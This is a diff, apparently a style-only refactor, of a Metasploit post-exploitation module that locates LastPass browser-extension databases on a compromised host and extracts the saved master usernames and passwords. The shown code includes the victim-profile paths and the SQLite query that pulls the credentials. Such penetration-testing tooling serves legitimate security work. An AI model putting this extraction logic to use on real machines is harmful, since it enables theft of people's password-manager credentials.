@@ -10,16 +10,17 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'LastPass Master Password Extractor',
-      'Description' => %q{
-        This module extracts and decrypts LastPass master login accounts and passwords.
-      },
-      'License' => MSF_LICENSE,
-      'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
-      'Platform' => %w(linux osx unix win),
-      'SessionTypes' => %w(meterpreter shell)
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'LastPass Master Password Extractor',
+        'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords',
+        'License' => MSF_LICENSE,
+        'Author' => ['Alberto Garcia Illera <agarciaillera[at]gmail.com>', 'Martin Vigo <martinvigo[at]gmail.com>'],
+        'Platform' => %w(linux osx unix win),
+        'SessionTypes' => %w(meterpreter shell)
+      )
+    )
   end
 
   def run
@@ -30,7 +31,7 @@ class Metasploit3 < Msf::Post
 
     print_status "Searching for LastPass databases..."
 
-    db_map = get_database_paths # Find databases and get the remote paths
+    db_map = database_paths # Find databases and get the remote paths
     if db_map.empty?
       print_status "No databases found"
       return
@@ -60,7 +61,11 @@ class Metasploit3 < Msf::Post
 
           # Parsing/Querying the DB
           db = SQLite3::Database.new(loot_path)
-          user, pass = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';").flatten
+          user, pass = db.execute(
+            "SELECT username, password FROM LastPassSavedLogins2 " \
+            "WHERE username IS NOT NULL AND username != '' " \
+            "AND password IS NOT NULL AND password != '';"
+          ).flatten
           credentials << [user, pass, browser] if user && pass
         end
       end
@@ -78,9 +83,9 @@ class Metasploit3 < Msf::Post
   end
 
   # Finds the databases in the victim's machine
-  def get_database_paths
+  def database_paths
     platform = session.platform
-    existing_profiles = get_user_profiles
+    existing_profiles = user_profiles
     found_dbs_map = {
       'Chrome' => [],
       'Firefox' => [],
@@ -106,7 +111,7 @@ class Metasploit3 < Msf::Post
         print_status "Found user: #{user_profile['UserName']}"
         browser_path_map = {
           'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
-          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
+          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox"
         }
       end
     when /osx/
@@ -136,7 +141,7 @@ class Metasploit3 < Msf::Post
 
     print_status "Checking in #{browser}..."
     if browser == "Firefox" # Special case for Firefox
-      profiles = get_firefox_profile_files(path, browser)
+      profiles = firefox_profile_files(path, browser)
       unless profiles.empty?
         print_good "Found #{profiles.size} profile files in Firefox"
         found_dbs_paths |= profiles
@@ -149,7 +154,7 @@ class Metasploit3 < Msf::Post
   end
 
   # Returns the relevant information from user profiles
-  def get_user_profiles
+  def user_profiles
     user_profiles = []
     case session.platform
     when /unix|linux/
@@ -212,7 +217,7 @@ class Metasploit3 < Msf::Post
   end
 
   # Returns the profile files for Firefox
-  def get_firefox_profile_files(path, browser)
+  def firefox_profile_files(path, browser)
     found_dbs_paths = []
 
     if directory?(path)
